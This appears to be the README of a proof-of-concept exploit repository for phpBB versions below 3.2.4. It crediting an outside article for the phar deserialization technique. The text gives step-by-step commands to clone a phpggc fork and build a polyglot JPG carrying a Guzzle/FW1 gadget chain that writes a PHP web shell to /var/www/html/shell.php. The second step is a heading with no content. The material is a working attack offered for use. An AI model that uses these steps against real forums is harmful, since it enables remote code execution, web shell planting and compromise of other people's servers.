# NiceForum

Exploiting phpBB < 3.2.4
Technique taken from the following article. Article also contains technical details regarding the exploitation.
I am NOT the author of the following article, I have only created the POC file to exploit the vulnerability.
https://blog.ripstech.com/2018/phpbb3-phar-deserialization-to-remote-code-execution/

Step 1  - Create the payload  
  
Download the following repo  
git clone https://github.com/s-n-t/phpggc.git  
cd phpggc  
git clone https://github.com/RealLinkers/NiceForum  
chmod +x pharggc  
./pharggc -j ./NiceForum/yourawesomepicture.jpg -o polyglotfiletoupload.jpg Guzzle/FW1 /var/www/html/shell.php ./NiceForum/shell.php  

./pharggc -j <yourphoto.jpg> -o <polyglot.jpg> Guzzle/FW1 <your remote directory where the file will be written to> <your local shell file>  
  
 
 Step 2 - Run exploit code  


